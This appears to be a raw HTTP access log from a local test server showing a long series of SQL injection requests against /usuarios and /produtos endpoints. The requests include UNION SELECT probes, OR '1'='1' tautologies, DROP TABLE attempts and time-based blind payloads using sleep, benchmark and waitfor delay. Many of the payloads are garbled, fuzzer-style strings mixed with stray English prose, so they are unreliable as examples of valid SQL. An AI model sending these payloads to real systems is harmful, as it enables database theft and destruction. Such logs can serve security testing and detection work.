Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl_,%20S,%20@,vERSiON%20(%20(SELeCt%200x0b1)%20)%20,(selEcT%200x1)%20)%20, HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matecbumpable%20)%20)%20; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_name%20FROM%20dual%20)%20; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20userschame%20cancore%20unaterale/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture)%20palive%20tyon%20table%20)%20+' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20(%20table_sameid_all_vestable%20)%20AND%20'i'%20=%20'1'%20or%20'1'%20=%20'1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20False HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20tabennem%20in%20interselies%20Deatires%20,%20Ganelo%20D%20plays%20an%20Jennifer%20bestand%20up%20and%20particularly%20grating%20and%20daring,%20they%20have%20already%20created%20a%20greaty%20story%20about%20a%20highling%20of%20the%20Shew%20in%20a%20strange%20sense%20of%20how%20comedie HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20usercameredor'%20version%20'name%20=%20'ban',%20like%20'abs'%20or%20'1'%20=%20'1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matebempelabes%20table%20;)%20;; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture%20'exan; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20-%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SET%20+U HTTP/1.1
172.18.0.1 - DELETE /usuarios/test';%20DROP%20TABLE%20SEMANCEXRES%20( HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test%22%20OR%20%221%22=%221%22%20or%201=1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20*%20from%20users%20where%20id%20=%20'1'%20or%20$+%3C$%20union%20select%201,@@VERSION%20--%201' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20%22azkc%22%20=%20%22azkc HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20where%204277%20=%204277%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20as%20zqxa%20where%205718%20=%205718%20and%203580%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-9740%22%20)%20)%20as%20pxkx%20where%205305%20=%205305%20or%201%20group%20by%20concat%20(%200x7171706a71,%20(%20select%20(%20case%20when%20(%204232%20=%204232%20)%20then%201%20else%200%20end%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20having%20min%20(%200%20)%20 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20union%20all%20select%20null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1');select%20count(*)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%22%20)%20as%20ezoa%20where%204915%20=%204915%20and%209198%20=%209198%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20where%209381%20=%209381%20or%20elt%20(%206272%20=%206272,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20113 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20as%20sgmv%20where%203876%20=%203876 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-5967%20or%203440%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203440%20=%203440%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20113%20)%20)%20a HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20union%20all%20select%20null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20and%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20)%20)%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20(%20(%20'%25'%20=%20'--This%20is%20a%20masterpiece.%20After%20all%20he%20would%20retrained%20to%20a%20standard%20super%20sable,%20just%20appearing%20narcistic%20and%20drugit,%20lurdy%20bad%20cartoon.%20The%20story%20is HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25%22%20)%20)%20)%20or%208315%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test0o1%22%20)%20)%20As%20Jfeq%20whERe%20(SEleCT%20(SELeCT%20(SeLECt%20(sELect%200X1510))))%20LIKe%200O0X0O0X18a0B3O7%20&&%20(sELeCT%20(seLECT%200x158B))%20lIKE%20dBMs_PIpe.rECeiVe_mESSagE%20(%20CHr%20(%20(sELecT%20(SeLECT%20(SELEcT%20(SEleCt%20(SELECT%20113)))))%20)%20%7C%7CcHR%20(%20(SeLEct%20(sELECT%20(SE HTTP/1.1
172.18.0.1 - DELETE /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20)%201%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20and%20make_set%20(%208403%20=%208403,8899%20)%20and%20(%20'ojag'%20=%20'ojag HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-4307'%20)%20as%20exdm%20where%206578%20=%206578%20or%20597%20=%205898%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20as%20aixy%20where%207694%20=%207694%20and%203580%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-2782'))%20or%201%20group%20by%20concat(0x7171706a71,(select%20(case%20when%20(4232=4232)%20then%201%20else%200%20end)),0x717a767a71,floor(rand(0)*2))%20having%20min(0) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%20)%20)%20as%20xovu%20where%204530%20=%204530%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25'%20)%20)%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-4165'%20where%202734%20=%202734%20union%20all%20select%203274,3274,3274,3274,3274,3274,3274,3274,3274,3274%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20and%20(%203020%20=%203020%20)%20*6703%20and%20(%20'rskq'%20=%20'rskq HTTP/1.1
172.18.0.1 - DELETE /usuarios/test-7868%22%20union%20all%20select%201805%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1%25%22%20)%20)%20or%208466%20=%20benchmark%20(%205000000,md5%20(%200x694a4745%20)%20)%20and%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test1'%20)%20and%20elt%20(%204249%20=%204249,7259%20)%20and%20(%20'bkag'%20=%20'bkag HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentylol+%29+%27vers+tibelvain%27+from+vysion+where+1+%3D+1+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_sccame_tabesm%2Cvibs%3Bant%282+SlEcT+%28+%29+%29+%26%26+True%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%3B%2C+charant+able+fale+%29+%2C1%2Cversion+%28+%29+%3Bniove+%28+select+1+from+%28+select+%28+sleep+%28+5+%29+%29+yddu+%29+%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+tall_fale+select+%40%40versionall%24+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%28SELECT+%28SELECT+%28SELECT+0x1%29%29%29+%29+ANd+%27i%27+LIKe+%27i%27+AnD+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27DbO2%27+%29+%2CLIke+%27bYXC2%27+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name%27+%29+%2CCHAR+%28+113+%29+%2B+%28+SelEct+%28+CASE+WhEN+%28+0O0X13eB+lIke+0X1e0X0x0b10+%29+tHEn+ReGexp_substrInG HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verseoncmane+%28+%27DBo2%27%2C0b10101111%2C0x8+%29+OR+%22.G%22+NOT+LIKE+%22%60%21%22+--+3 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+%27ynom%27%2C+%29+%2C1%2C1+%29+%29+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cname_Nibl_+%29+%2C%40%40VER+%29+LIME+%2C%271%27%2C%28SELECT+1%29+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale_chant+%28expattablen%29+%28+eHt+%29+%2C1%2C4+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatecbame_sate%3B2%2Cversion+a+%28+%27%3B+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charely%29+%24%29+%24valle_sere_table_fall+verv%3Avalse+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name+FROM+idb%24%3Basiring%27%2C+%27hart%27+like+%27aste HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+lyse+%3Brom%24+%29+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%28+table_name+tablesaler+AS+HisT+in+va HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+-+Table_name+%28+Chr+%28+%271%27+%2B+%29+%29+%29+waitfor+delay+%270%3A0%3A2%27+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calectare%27+%29+%2C+vale_s+t%28+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C1061+%29+and+%28+1928+%3D+1928 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%2Cverscomemant+totume+and+%27ibr%27+like+%27ibn HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%273%27+%7C%7C+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade%2Ccall+ing_tule_+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%40verscomance%283%29%29+OR+False%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmale%2Ctume_name%3B+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cavered%3B%29+%27int%27+%3C%3E+%27X%27%2F%2A%2A%2F%27%2F%2A%2A%2F+like+%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40%2C%40+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+table_name%27+%29+%3B+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27+UNION+SELECT+%40+verale+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+S+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+S HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%27%3B+DROP+TABLE+1+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221--%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221%23%22+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=%22+OR+%221%22%3D%221+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+sleep+%28+5+%29+and+%28+%28+%28+%22uvzc%22+like+%22uvzc HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+where+2764+%3D+2764+rlike+%28+select+%28+case+when+%28+7689+%3D+7689+%29+then+1+else+0x28+end+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%25%22+%29+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+%29+and+8407+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+and+%28+%28+%28+%27eflk%27+%3D+%27eflk HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%7C%7C+%28+select+%27zdfo%27+from+dual+where+4288+%3D+4288+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%251%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+as+sqzh+where+5672+%3D+5672+and+5556+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+%29+%29+and+8514+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29+and+%28+%28+%28+8738+%3D+8738 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+where+4698+%3D+4698+and+3580+%3D+%28+select+count+%28+%2A+%29+from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9193%22+where+2685+%3D+2685+union+all+select+2852%2C2852%2C2852%2C2852%2C2852%2C2852%2C2852%2C2852+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-1070%27%7C%7C+%28+select+%27ujoi%27+where+5265+%3D+2265+union+all+select+3625%2C3625%2C3625%2C3625%2C3625%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%2C+%28+select+%28+case+when+%28+8382+%3D+8382+%29+then+1+else+1%2F+%28+select+0+%29+end+%29+%29 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=admin%22+%29+or+%28+%221%22+%3D+%221%22%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27%2B%28select+%27nhlx%27+where+2291%3D2291+or+%28select+9173+from%28select+count%28%2A%29%2Cconcat%280x7171706a71%2C%28select+%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.character_sets+group+by+x%29a%29%29%2B%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-8699%22+%29+union+all+select+8645%2C8645%2C8645%2C8645%2C8645%2C8645+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1+%29+%29+as+wwys+where+9248+%3D+9248 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%7B%3F%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-3431%27+%29+or+5903+%3D+%28+%27qqpjq%27%7C%7C+%28+select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database+%29+%7C%7C%27qzvzq%27+%29+and+%28+%27ivxb%27+%3D+%27ivxb HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=i2s6cqiq4q86pp94cy6lhf6zjc8cl+lk6u1q4csxat4gqhzub2no+9vqeaqrtohnw75ebyqaa2coj9+x73smof3e+as5q1+%29+%29+as+fmpr+where+3103+%3D+3103+and+elt+%28+9970+%3D+9297%2C9297+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-2803%27+%29+as+jciy+where+1130+%3D+1130+or+make_set+%28+4599+%3D+6550%2C6550+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+%29+as+jebl+where+3464+%3D+3464+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-2373%25%22+%29+or+9323+%3D+9323%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9205%27+%29+%29+union+all+select+6575%2C6575%2C6575%2C6575%2C6575%23 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=19q4+h6t+v9jij9jjt+select+%2A+from+users+where+id+%3D+%271%27+union+select+%5C%23%2C%40%40VERSION+--+1%27 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%22+%29+%29+%29+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.character_sets+group+by+x+%29+a+%29+and+%28+%28+%28+%22blkt%22+like HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+and+6537+%3D+dbms_pipe.receive_message+%28+chr+%28+76+%29+%7C%7Cchr+%28+116+%29+%7C%7Cchr+%28+117+%29+%7C%7Cchr+%28+65+%29+%2C5+%29+and+%28+%27rgue%27+like+%27rgue HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+%29+as+idqc+where+5288+%3D+5288+and+elt+%28+1210+%3D+1210%2Csleep+%28+5+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=-9772%27+or+5023+%3D+ctxsys.drithsx.sn+%28+5023%2C+%28+chr+%28+113+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+112+%29+%7C%7Cchr+%28+106+%29+%7C%7Cchr+%28+113+%29+%7C%7C+%28+select+%28+case+when+%28+5023+%3D+5023+%29+then+1+else+0+end+%29+from+dual+%29+%7C%7Cchr+%28+113+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+118+%29+%7C%7Cchr+%28+122+%29+%7C%7Cchr+%28+1 HTTP/1.1
172.18.0.1 - GET /usuarios/busca/?nome=1%27+where+7417+%3D+7417+and+8407+%3D+%28+select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20;%20Or%201%20%3C)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbfn HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20velect%20tevenanler%20rytignifale%20'%3E/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,110%20)%20)%20and%20'zbq'%20=%20'zbqs HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1'%20)%20%3E%201%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(callent%20)%20version%20)%20+%201,1,SLEEP%20((%205%20)%20)%20;and%20'i HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat%20'%20Fibe'%20)%20and%20'1'%20=%20'1'%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20columnt%20anl/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20-%20Table_name,%20DiRLat%20Dubs_ROce_PASs%20)%20)%20Or%20'g'%20NOT%20LikE%20'G'%20oR%200x0%20OR%200%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20userschamelocver%20ta/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1',1,1%20)%20) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$,%20ly%20)%20'/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20lyan,%20t1),%20Deap%20)%20)%20; HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1,14%20)%20%3E%201%20)%20%3E%201%20) HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybchacall*12%20)%20)%20;and%20/**/ HTTP/1.1
